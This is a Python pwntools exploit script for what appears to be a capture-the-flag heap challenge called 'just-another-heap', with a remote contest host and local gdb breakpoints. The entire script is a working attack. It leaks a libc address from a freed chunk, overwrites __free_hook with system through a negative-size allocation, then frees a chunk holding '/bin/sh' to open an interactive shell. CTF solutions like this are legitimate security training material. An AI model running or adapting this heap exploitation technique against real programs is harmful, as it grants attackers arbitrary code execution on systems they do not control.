from pwn import *
from sys import *

libc = ELF('libc.so.6')
elf = ELF('./heap')

p = process('./heap')
HOST = 'dctf-chall-just-another-heap.westeurope.azurecontainer.io'
PORT = 7481

cmd = """
b*0x0000000000401125
b*0x0000000000400B53
b*0x0000000000400DE8
b*0x400b3b
b*0x400a09
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

def add(idx,name,size,offset,payload):
	sleep(0.1)
	p.sendline('1')
	p.sendline(str(idx))
	p.sendline(name)
	p.sendline(str(size))
	p.sendline(str(offset))
	p.sendline(payload)
	p.sendline(b'Y')
	p.sendline(b'Y')

def edit(idx,choice,payload):
	p.sendline('4')
	p.sendline(str(idx))
	p.sendline(choice)
	sleep(0.05)
	p.send(payload)

def delete(idx):
	p.sendline(b'3')
	p.sendline(str(idx))

def relive(idx):
	p.sendline(b'2')
	p.sendline(str(idx))

add(0,b'0'*4,0x440,0x10,b'B'*0x8)
add(1,b'1'*4,0x30,0x0,b'/bin/sh\x00')
delete(0)
add(2,b'2'*4,0x30,0x5,b'')
sleep(0.5)
edit(2,b'N',b'X'*4)
sleep(0.5)
relive(2)
sleep(1)
p.recvuntil("_____XXX")
leak = u64(p.recvn(6)+b'\x00'*2)
libc.address = (leak - libc.sym['__malloc_hook'] & ~0xfff) + 0x1000
print("LEAK(): ", hex(leak))
print("LIBC(): ", hex(libc.address))


#gdb.attach(p,cmd)
sleep(1)
add(0,b'L'*4,-10000,libc.sym['__free_hook'],p64(libc.sym['system']))
sleep(1)
delete(1)
#delete(0)



p.interactive()